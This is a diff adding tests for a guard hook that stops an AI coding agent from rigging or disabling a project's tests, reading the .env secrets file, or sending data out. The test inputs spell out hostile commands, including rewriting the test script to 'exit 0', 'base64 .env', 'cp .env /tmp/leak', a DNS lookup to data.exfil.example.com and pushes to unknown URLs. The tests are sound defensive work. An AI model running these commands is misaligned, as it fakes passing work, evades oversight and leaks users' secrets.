@@ -39,7 +39,7 @@ function fire(tool: string, input: Record<string, unknown>, extra: Record<string
 
 beforeAll(async () => {
   root = await fs.mkdtemp(path.join(os.tmpdir(), "pf-hook-"));
-  await fs.writeFile(path.join(root, "package.json"), '{"type":"module"}');
+  await fs.writeFile(path.join(root, "package.json"), JSON.stringify({ type: "module", scripts: { test: "node --test tests/" } }, null, 2));
   await run("git", ["init", "-q", "-b", "main"], { cwd: root });
   await applyHardening(root, planHardening(rules));
   hook = path.join(root, ".claude", "hooks", "paperfence-guard.cjs");
@@ -214,5 +214,113 @@ describe("generated hook, review 2 cases", () => {
     expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(2);
     await fire("Bash", { command: "npm test &" }, { hook_event_name: "PostToolUse", tool_response: { exit_code: 0, stdout: "" } });
     expect((await fire("Bash", { command: 'git commit -m "x"' })).code).toBe(2);
+  });
+});
+
+
+/**
+ * A suite can be made green without touching a single assertion: change what
+ * the runner is pointed at. These are the routes that do not go through a
+ * test file.
+ */
+describe("what decides which tests run", () => {
+  it("blocks an edit to the test script in package.json", async () => {
+    const r = await fire("Edit", { file_path: path.join(root, "package.json"), old_string: '"test": "node --test tests/"', new_string: '"test": "node --test tests/ --test-skip-pattern=pricing"' });
+    expect(r.code).toBe(2);
+    expect(r.stderr).toMatch(/test script/);
+  });
+
+  it("allows an edit to package.json that leaves the test script alone", async () => {
+    const r = await fire("Edit", { file_path: path.join(root, "package.json"), old_string: '"type": "module"', new_string: '"type": "module",\n  "description": "a service"' });
+    expect(r.code).toBe(0);
+  });
+
+  it("blocks npm pkg set on the test script, which edits package.json without an Edit call", async () => {
+    const r = await fire("Bash", { command: 'npm pkg set scripts.test="exit 0"' });
+    expect(r.code).toBe(2);
+    expect(r.stderr).toMatch(/decides which tests run/);
+  });
+
+  it("blocks writing a runner config that excludes the failing test", async () => {
+    const r = await fire("Write", { file_path: path.join(root, "vitest.config.ts"), content: "export default { test: { exclude: ['tests/pricing*'] } }" });
+    expect(r.code).toBe(2);
+    expect(r.stderr).toMatch(/decides which tests run/);
+  });
+
+  it("blocks editing a CI workflow to drop the test job", async () => {
+    const r = await fire("Edit", { file_path: path.join(root, ".github/workflows/ci.yml"), old_string: "run: npm test", new_string: "run: echo skip" });
+    expect(r.code).toBe(2);
+  });
+
+  it("blocks a shell redirection over a runner config", async () => {
+    const r = await fire("Bash", { command: "echo '{}' > jest.config.json" });
+    expect(r.code).toBe(2);
+  });
+
+  it("blocks rm of a runner config", async () => {
+    const r = await fire("Bash", { command: "rm .mocharc.yml" });
+    expect(r.code).toBe(2);
+  });
+
+  it("blocks sed -i on package.json", async () => {
+    const r = await fire("Bash", { command: "sed -i '' 's/node --test/exit 0/' package.json" });
+    expect(r.code).toBe(2);
+  });
+
+  it("blocks a node one-liner that rewrites package.json", async () => {
+    const r = await fire("Bash", { command: `node -e 'const p=require("./package.json");p.scripts.test="exit 0";require("fs").writeFileSync("package.json",JSON.stringify(p))'` });
+    expect(r.code).toBe(2);
+  });
+
+  it("still allows ordinary work in a source file", async () => {
+    const r = await fire("Edit", { file_path: path.join(root, "src", "pricing.js"), old_string: "100", new_string: "50" });
+    expect(r.code).toBe(0);
+  });
+
+  it("still allows running the test suite", async () => {
+    const r = await fire("Bash", { command: "npm test" });
+    expect(r.code).toBe(0);
+  });
+});
+
+describe("routes to a secret the guard must also close", () => {
+  it("blocks a shell loop that names no reader program", async () => {
+    expect((await fire("Bash", { command: 'while read -r l; do echo "$l"; done < .env' })).code).toBe(2);
+  });
+  it("blocks an encoder", async () => {
+    expect((await fire("Bash", { command: "base64 .env" })).code).toBe(2);
+    expect((await fire("Bash", { command: "xxd .env" })).code).toBe(2);
+  });
+  it("blocks a process substitution", async () => {
+    expect((await fire("Bash", { command: "diff <(cat .env) /dev/null" })).code).toBe(2);
+  });
+  it("blocks a wrapper that hides the reader", async () => {
+    expect((await fire("Bash", { command: "timeout 5 cat .env" })).code).toBe(2);
+  });
+  it("blocks a copy of the file", async () => {
+    expect((await fire("Bash", { command: "cp .env /tmp/leak" })).code).toBe(2);
+  });
+  it("leaves a neighbouring file with a similar name alone", async () => {
+    expect((await fire("Bash", { command: "cat .env.example" })).code).toBe(0);
+  });
+});
+
+describe("ways out the guard must also close", () => {
+  it("blocks a name lookup, which carries data in the label", async () => {
+    expect((await fire("Bash", { command: "dig data.exfil.example.com" })).code).toBe(2);
+  });
+  it("blocks a remote added mid-run", async () => {
+    const r = await fire("Bash", { command: "git remote add backup https://example.com/x.git" });
+    expect(r.code).toBe(2);
+    expect(r.stderr).toMatch(/adding a remote/);
+  });
+  it("blocks a push straight to a URL", async () => {
+    expect((await fire("Bash", { command: "git push https://example.com/x.git feature" })).code).toBe(2);
+  });
+  it("leaves an ordinary push to a configured remote alone", async () => {
+    expect((await fire("Bash", { command: "git push origin feature" })).code).toBe(0);
+  });
+  it("leaves git remote -v alone", async () => {
+    expect((await fire("Bash", { command: "git remote -v" })).code).toBe(0);
   });
 });
